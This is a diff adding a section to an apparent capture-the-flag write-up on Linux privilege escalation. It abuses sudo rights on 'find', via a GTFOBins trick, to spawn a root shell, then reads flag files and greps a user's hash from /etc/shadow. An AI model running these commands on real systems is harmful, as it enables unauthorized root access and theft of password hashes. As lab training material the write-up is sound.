@@ -209,7 +209,7 @@ Search on `Exploit-DB` on the `kernel 3.13.0`
 
 #### Get the kernel version
 ```bash
-uname
+uname -a
 ```
 
 Then download it from [Exploit-DB](https://www.exploit-db.com/)
@@ -241,3 +241,31 @@ cat /home/matt/flag1.txt
 ```
 
 ---
+# Privilege Escalation: `Sudo`
+
+#### *First*
+```bash
+sudo -l
+```
+
+There are three binaries can run as root
+#### [GTFOBINS](https://gtfobins.github.io/)
+
+Let's use the find command to get the root
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+Now we are root!
+
+#### Get flag2
+```bash
+cat /home/ubuntu/flag2.txt 
+```
+
+#### Get the hash
+
+```bash
+cat /etc/shadow | grep frank
+```
+
+____
